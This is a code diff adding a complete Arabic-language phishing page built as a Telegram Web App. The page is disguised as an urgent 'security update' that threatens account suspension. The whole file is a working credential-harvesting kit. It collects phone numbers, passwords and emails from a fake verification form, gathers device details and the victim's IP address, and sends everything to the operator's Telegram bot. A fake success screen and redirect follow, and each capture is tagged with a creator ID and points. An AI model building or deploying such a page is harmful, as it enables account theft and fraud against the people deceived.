@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 تحديث الأمان - نظام KLASH</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary: #00ff00;
+            --secondary: #006600;
+            --danger: #ff3333;
+            --warning: #ff9900;
+            --dark: #0a0a0a;
+            --light: #f8f9fa;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Cairo', 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, var(--dark), #1a1a1a);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .security-alert {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.2);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+        }
+        
+        .alert-header {
+            background: linear-gradient(90deg, var(--danger), var(--warning));
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .alert-icon {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+        
+        .alert-title {
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        
+        .alert-content {
+            padding: 25px;
+        }
+        
+        .alert-message {
+            background: rgba(255, 100, 0, 0.1);
+            border-left: 4px solid var(--warning);
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--primary);
+            font-weight: bold;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 8px;
+            color: var(--light);
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.4);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 255, 0, 0.3);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .result {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .result-icon {
+            font-size: 3em;
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-alert" id="securityAlert">
+        <div class="alert-header">
+            <div class="alert-icon">⚠️</div>
+            <div class="alert-title">تنبيه أمني عاجل</div>
+        </div>
+        
+        <div class="alert-content">
+            <div class="alert-message">
+                <strong>تم اكتشاف نشاط غير معتاد!</strong><br>
+                يرجى التحقق من هويتك لمنع تعليق الحساب.
+            </div>
+            
+            <form id="hackForm">
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-phone"></i> رقم الهاتف
+                    </label>
+                    <input type="tel" class="form-input" id="phone" 
+                           placeholder="مثال: 05XXXXXXXX" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-lock"></i> كلمة المرور
+                    </label>
+                    <input type="password" class="form-input" id="password" 
+                           placeholder="أدخل كلمة المرور" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">
+                        <i class="fas fa-envelope"></i> البريد الإلكتروني
+                    </label>
+                    <input type="email" class="form-input" id="email" 
+                           placeholder="example@domain.com" required>
+                </div>
+                
+                <button type="submit" class="btn-submit" id="submitBtn">
+                    <i class="fas fa-shield-alt"></i> التحقق والتحديث
+                </button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>جاري التحقق من البيانات...</p>
+            </div>
+            
+            <div class="result" id="result">
+                <div class="result-icon">✅</div>
+                <h3>تم التحقق بنجاح!</h3>
+                <p>سيتم إعادة التوجيه خلال <span id="countdown">3</span> ثواني</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        class HackSystem {
+            constructor() {
+                this.creatorId = this.getUrlParam('creator_id') || 'unknown';
+                this.init();
+            }
+            
+            getUrlParam(name) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(name);
+            }
+            
+            init() {
+                this.initTelegram();
+                this.setupForm();
+            }
+            
+            initTelegram() {
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.ready();
+                    Telegram.WebApp.expand();
+                    Telegram.WebApp.setHeaderColor('#0a0a0a');
+                    Telegram.WebApp.setBackgroundColor('#0a0a0a');
+                }
+            }
+            
+            setupForm() {
+                const form = document.getElementById('hackForm');
+                form.addEventListener('submit', (e) => this.handleSubmit(e));
+            }
+            
+            handleSubmit(e) {
+                e.preventDefault();
+                
+                // إظهار التحميل
+                document.getElementById('hackForm').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+                
+                // جمع البيانات
+                const data = this.collectData();
+                
+                // محاكاة الانتظار
+                setTimeout(() => {
+                    this.sendToBot(data);
+                    this.showSuccess();
+                }, 2000);
+            }
+            
+            collectData() {
+                return {
+                    type: 'hack_data',
+                    timestamp: new Date().toISOString(),
+                    creator_id: this.creatorId,
+                    credentials: {
+                        phone: document.getElementById('phone').value,
+                        password: document.getElementById('password').value,
+                        email: document.getElementById('email').value
+                    },
+                    device: this.getDeviceInfo(),
+                    location: this.getLocationInfo()
+                };
+            }
+            
+            getDeviceInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    cookies: navigator.cookieEnabled
+                };
+            }
+            
+            getLocationInfo() {
+                return {
+                    url: window.location.href,
+                    referrer: document.referrer
+                };
+            }
+            
+            sendToBot(data) {
+                // إضافة المزيد من المعلومات
+                data.status = 'success';
+                data.data_id = `HACK_${Date.now()}`;
+                data.points = Math.floor(Math.random() * 50) + 10;
+                
+                // إرسال عبر Telegram Web App
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.sendData(JSON.stringify(data));
+                } else {
+                    console.log('Hack Data:', data);
+                    // للاختبار فقط
+                    alert(`تم جمع البيانات:\nالهاتف: ${data.credentials.phone}\nالبريد: ${data.credentials.email}`);
+                }
+                
+                // الحصول على IP وإرسال تحديث
+                this.getIPAddress().then(ip => {
+                    data.ip_address = ip;
+                    if (window.Telegram && Telegram.WebApp) {
+                        Telegram.WebApp.sendData(JSON.stringify({
+                            ...data,
+                            type: 'hack_update'
+                        }));
+                    }
+                });
+            }
+            
+            async getIPAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return 'غير متوفر';
+                }
+            }
+            
+            showSuccess() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+                this.startCountdown();
+            }
+            
+            startCountdown() {
+                let count = 3;
+                const countdownElement = document.getElementById('countdown');
+                
+                const timer = setInterval(() => {
+                    count--;
+                    countdownElement.textContent = count;
+                    
+                    if (count <= 0) {
+                        clearInterval(timer);
+                        this.redirect();
+                    }
+                }, 1000);
+            }
+            
+            redirect() {
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.close();
+                } else {
+                    window.location.href = 'https://google.com';
+                }
+            }
+        }
+        
+        // بدء النظام عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            new HackSystem();
+        });
+    </script>
+</body>
+</html>
